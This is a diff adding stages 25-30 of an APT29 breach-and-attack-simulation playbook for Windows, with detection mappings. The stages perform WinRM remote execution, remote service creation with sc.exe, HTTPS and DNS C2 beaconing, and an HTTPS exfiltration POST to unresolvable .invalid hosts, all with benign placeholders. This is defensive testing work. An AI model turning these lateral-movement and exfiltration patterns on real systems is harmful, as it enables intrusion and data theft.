+    blast_radius: "SKIPs with an explicit reason when $env:BAS_APT29_TARGET_HOST is unset. When set: runs a benign no-op ScriptBlock via Invoke-Command against the target (writes nothing, returns a literal string only). APT29 uses WinRM for living-off-the-land remote execution. Generates Security EID 4624 (logon type 3) + WinRM Operational EID 91."
+    reversible: true
+    telemetry:
+      - "Security EID 4624 (Logon Type 3) on the target for the WinRM session"
+      - "Microsoft-Windows-WinRM/Operational EID 91: WinRM session created"
+    detection:
+      - "EDR/SIEM: WinRM remote PowerShell session from a workstation account  -  Sigma rule winrm_win_remote_powershell_session.yml"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $target = $env:BAS_APT29_TARGET_HOST
+      if ([string]::IsNullOrWhiteSpace($target)) {
+        Write-Output "SKIP: APT29 Stage 25 (WinRM Remote Execution Simulation) not run  -  no remote target host configured (`$env:BAS_APT29_TARGET_HOST unset). This step requires a second reachable host; configure the env var to run it. [BAS-SIM-APT29-S25]"
+      } else {
+        $result = Invoke-Command -ComputerName $target -ScriptBlock { "[BAS-SIM-APT29-S25]" } -ErrorAction SilentlyContinue
+        $ran = ($result -match 'BAS-SIM-APT29-S25')
+        Write-Output "EXEC T1021.006: WinRM benign no-op remote execution against $target ran=$ran. Security EID 4624 (Type 3) + WinRM EID 91 expected on the target. [BAS-SIM-APT29-S25]"
+        if ($ran) {
+          Write-Output "FAIL: WinRM remote execution succeeded unimpeded. SIEM should alert on WinRM sessions to this host outside change windows."
+        } elseif (Test-WSMan -ComputerName $target -ErrorAction SilentlyContinue) {
+          Write-Output "PASS: WinRM execution was denied while the endpoint is reachable. Access control is the likely cause; a misconfiguration would look the same, so this is not independently proven. [BAS-SIM-APT29-S25]"
+        } else {
+          Write-Output "ERROR: WinRM endpoint on $target is not reachable, so remote execution did not run. [BAS-SIM-APT29-S25]"
+        }
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 26 — Remote Service Execution Simulation (T1569.002)
+  # ---------------------------------------------------------------------------
+  - name: "APT29 Stage 26 — Remote Service Execution Simulation (T1569.002)"
+    technique_id: T1569.002
+    detection_profiles: [windows_apt29_lateral_movement]
+    framework: custom
+    executor: powershell
+    requires_priv: admin
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: medium
+    blast_radius: "SKIPs with an explicit reason when $env:BAS_APT29_TARGET_HOST is unset. When set: creates a Manual-start (never started) benign service on the target via sc.exe \\\\<target> create, confirms it, then deletes it. ERRORs (not SKIP) if the host is reachable but access is denied -- distinguishing 'no target configured' from 'target configured but denied'. APT29/PsExec-style actors use remote service creation for lateral code execution. Generates Security EID 4697 on the target."
+    reversible: true
+    telemetry:
+      - "Security EID 4697 (service installed) on the target host"
+    detection:
+      - "EDR/SIEM: remote service creation via sc.exe against a domain host  -  Sigma rule service_installation_win_remote.yml"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $target = $env:BAS_APT29_TARGET_HOST
+      if ([string]::IsNullOrWhiteSpace($target)) {
+        Write-Output "SKIP: APT29 Stage 26 (Remote Service Execution Simulation) not run  -  no remote target host configured (`$env:BAS_APT29_TARGET_HOST unset). This step requires a second reachable host; configure the env var to run it. [BAS-SIM-APT29-S26]"
+      } else {
+        $svcName = 'ZZ-BAS-APT29-RemSvc'
+        $createOut = & sc.exe "\\$target" create $svcName binPath= "cmd.exe /c echo [BAS-SIM-APT29-S26]" start= demand 2>&1 | Out-String
+        $created = $createOut -match 'SUCCESS'
+        $reachable = Test-NetConnection -ComputerName $target -Port 445 -InformationLevel Quiet -WarningAction SilentlyContinue
+        if ($created) {
+          & sc.exe "\\$target" delete $svcName 2>&1 | Out-Null
+          Write-Output "EXEC T1569.002: remote service '$svcName' created on \\$target then deleted. Security EID 4697 expected on the target. [BAS-SIM-APT29-S26]"
+          Write-Output "FAIL: Remote service creation succeeded unimpeded. SIEM should alert on remote service installation via sc.exe against this host."
+        } elseif ($reachable) {
+          Write-Output "PASS: remote service creation was denied while SMB 445 is reachable. Access control or firewall policy is the likely cause; insufficient privilege would look the same, so this is not independently proven. [BAS-SIM-APT29-S26]"
+        } else {
+          Write-Output "ERROR: $target is not reachable on SMB 445, so remote service creation did not run. [BAS-SIM-APT29-S26]"
+        }
+      }
+    cleanup: |
+      if (-not [string]::IsNullOrWhiteSpace($env:BAS_APT29_TARGET_HOST)) {
+        & sc.exe "\\$env:BAS_APT29_TARGET_HOST" delete 'ZZ-BAS-APT29-RemSvc' 2>&1 | Out-Null
+      }
+
+  # ---------------------------------------------------------------------------
+  # PHASE 7 — C2 / COLLECTION / EXFILTRATION CLUSTER (stages 27-30)
+  # ---------------------------------------------------------------------------
+
+  # ---------------------------------------------------------------------------
+  # Stage 27 — HTTPS C2 Beacon Simulation (T1071.001)
+  # ---------------------------------------------------------------------------
+  - name: "APT29 Stage 27 — HTTPS C2 Beacon Simulation (T1071.001)"
+    technique_id: T1071.001
+    detection_profiles: [windows_apt29_c2_exfil]
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Issues a real HTTPS GET to a fixed, BAS-owned, RFC-6761-guaranteed-non-routable .invalid domain (same safety pattern as Stage 5's DNS beacon). DNS resolution fails before any TLS handshake, so no real C2 channel is ever established. Generates Sysmon EID 22 (DNS query) and EID 3 (network connection attempt) if resolution briefly succeeds at the resolver level before NXDOMAIN."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 22: DNS query for bas-sim-apt29-<runid>.invalid"
+      - "Sysmon EID 1: powershell.exe issuing Invoke-WebRequest"
+    detection:
+      - "SIEM: HTTPS requests to a .invalid TLD  -  these should never succeed; flag at SIEM / proxy"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $beaconUrl = "https://bas-sim-apt29-$runId.invalid/beacon"
+      $succeeded = $false
+      try { $null = Invoke-WebRequest -Uri $beaconUrl -TimeoutSec 5 -ErrorAction Stop; $succeeded = $true } catch { $succeeded = $false }
+      Write-Output "EXEC T1071.001: HTTPS C2 beacon simulation GET $beaconUrl. succeeded=$succeeded (expected: false  -  RFC6761 .invalid never resolves). No real C2 channel exists. Sysmon EID 22 expected. [BAS-SIM-APT29-S27]"
+      if ($succeeded) {
+        Write-Output "FAIL: HTTPS request to a .invalid domain succeeded  -  DNS/proxy filtering is NOT in place. A real APT29 C2 domain could succeed the same way."
+      } else {
+        Write-Output "PASS: .invalid domain request failed to resolve/connect as expected. DNS/network telemetry generated for SIEM verification without a real C2 channel. [BAS-SIM-APT29-S27]"
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 28 — DNS Periodic Beacon Detection (T1071.004)
+  # ---------------------------------------------------------------------------
+  - name: "APT29 Stage 28 — DNS Periodic Beacon Detection (T1071.004)"
+    technique_id: T1071.004
+    detection_profiles: [windows_dns_c2]
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Distinct from Stage 5's single-shot DNS beacon: issues the same .invalid-domain nslookup pattern 3 times at a fixed 2-second interval to generate a periodicity signal a SIEM beacon-detection rule could alert on. No real C2 channel; RFC 6761 guarantees NXDOMAIN. Generates Sysmon EID 22 x3."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 22 x3: periodic DNS queries to bas-sim-apt29-<runid>-N.invalid at a fixed interval"
+    detection:
+      - "SIEM: fixed-interval DNS queries to the same base domain from one host  -  beaconing-periodicity detection, distinct from Stage 5's single-query signal"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $anyResolved = $false
+      $allNx = $true
+      $anyTimedOut = $false
+      for ($i = 1; $i -le 3; $i++) {
+        $beaconDomain = "bas-sim-apt29-$runId-$i.invalid"
+        $nsOut = & nslookup.exe $beaconDomain 2>&1 | Out-String
+        if ($nsOut -match ('Name:\s+' + [regex]::Escape($beaconDomain))) { $anyResolved = $true }
+        if ($nsOut -notmatch "Non-existent domain") { $allNx = $false }
+        if ($nsOut -match 'timed out|no servers could be reached') { $anyTimedOut = $true }
+        if ($i -lt 3) { Start-Sleep -Seconds 2 }
+      }
+      Write-Output "EXEC T1071.004: periodic DNS beacon simulation sent 3 nslookup queries at a 2s interval to bas-sim-apt29-$runId-*.invalid. any_resolved=$anyResolved (expected: false). Sysmon EID 22 x3 expected  -  distinct periodicity signal from Stage 5's single query. [BAS-SIM-APT29-S28]"
+      if ($anyTimedOut -and -not $anyResolved) {
+        Write-Output "ERROR: DNS server timed out during the periodic beacon; NXDOMAIN could not be judged. [BAS-SIM-APT29-S28]"
+      } elseif (-not $allNx -and -not $anyResolved) {
+        Write-Output "ERROR: at least one periodic query returned neither an answer nor NXDOMAIN, so NXDOMAIN was not observed for every query. [BAS-SIM-APT29-S28]"
+      } elseif ($anyResolved) {
+        Write-Output "FAIL: A .invalid domain resolved during the periodic beacon  -  DNS RPZ/NXDOMAIN filtering is NOT in place."
+      } else {
+        Write-Output "PASS: All .invalid domains returned NXDOMAIN as expected. Periodic DNS telemetry generated for SIEM beacon-detection verification. [BAS-SIM-APT29-S28]"
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 29 — Sensitive File Discovery and Collection (T1005)
+  # ---------------------------------------------------------------------------
+  - name: "APT29 Stage 29 — Sensitive File Discovery and Collection (T1005)"
+    technique_id: T1005
+    detection_profiles: [windows_apt29_c2_exfil]
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Creates ONE benign synthetic file under $env:TEMP containing only a literal [BAS-SIM] marker string (never touches any real user file), searches for it scoped to $env:TEMP only, confirms it is found, then deletes it. Generates Sysmon EID 11 (file create) + file-search process telemetry."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 11: synthetic marker file created under $env:TEMP"
+      - "Sysmon EID 1: Get-ChildItem -Recurse scoped to $env:TEMP"
+    detection:
+      - "EDR: recursive file search for sensitive-sounding filenames from a scripting engine  -  Sigma rule file_event_win_sensitive_file_discovery.yml"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $markerFile = Join-Path $env:TEMP 'BAS-SIM-APT29-S29-marker.txt'
+      Set-Content -Path $markerFile -Value '[BAS-SIM] synthetic sensitive-file marker  -  not a real document' -Force
+      $found = @(Get-ChildItem -Path $env:TEMP -Recurse -Filter '*BAS-SIM-APT29-S29*' -ErrorAction SilentlyContinue)
+      $located = ($found.Count -gt 0)
+      Remove-Item $markerFile -Force -ErrorAction SilentlyContinue
+      Write-Output "EXEC T1005: synthetic sensitive-file discovery, marker created and located=$located, then deleted. Scoped to `$env:TEMP only  -  no real user file was touched. Sysmon EID 11 expected. [BAS-SIM-APT29-S29]"
+      if ($located) {
+        Write-Output "FAIL: Sensitive-file discovery/collection pattern ran unimpeded. EDR should flag recursive searches for sensitive-sounding filenames outside normal application behavior."
+      } else {
+        Write-Output "PASS: File discovery blocked or the marker was not found. [BAS-SIM-APT29-S29]"
+      }
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'BAS-SIM-APT29-S29-marker.txt') -Force -ErrorAction SilentlyContinue
+
+  # ---------------------------------------------------------------------------
+  # Stage 30 — HTTPS Exfiltration Simulation (T1041)
+  # ---------------------------------------------------------------------------
+  - name: "APT29 Stage 30 — HTTPS Exfiltration Simulation (T1041)"
+    technique_id: T1041
+    detection_profiles: [windows_apt29_c2_exfil]
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Issues a real HTTPS POST with a small synthetic body to the same .invalid-domain pattern as Stage 27  -  DNS resolution fails before any TLS handshake, so no real exfiltration channel is ever established. Completes the 30-stage Windows file. Generates Sysmon EID 22 (DNS query)."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 22: DNS query for bas-sim-apt29-<runid>-exfil.invalid"
+    detection:
+      - "SIEM: outbound HTTPS POST to a .invalid TLD  -  should never succeed; flag at SIEM / proxy / DLP egress inspection"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $exfilUrl = "https://bas-sim-apt29-$runId-exfil.invalid/upload"
+      $body = '[BAS-SIM-APT29-S30] synthetic exfil payload  -  not real data'
+      $succeeded = $false
+      try { $null = Invoke-WebRequest -Uri $exfilUrl -Method Post -Body $body -TimeoutSec 5 -ErrorAction Stop; $succeeded = $true } catch { $succeeded = $false }
+      Write-Output "EXEC T1041: HTTPS exfiltration simulation POST $exfilUrl with a synthetic body. succeeded=$succeeded (expected: false). No real exfil channel exists. Sysmon EID 22 expected. [BAS-SIM-APT29-S30]"
+      if ($succeeded) {
+        Write-Output "FAIL: HTTPS POST to a .invalid domain succeeded  -  DNS/proxy/DLP egress filtering is NOT in place."
+      } else {
+        Write-Output "PASS: .invalid domain POST failed to resolve/connect as expected. [BAS-SIM-APT29-S30]"
+      }
+    cleanup: ""
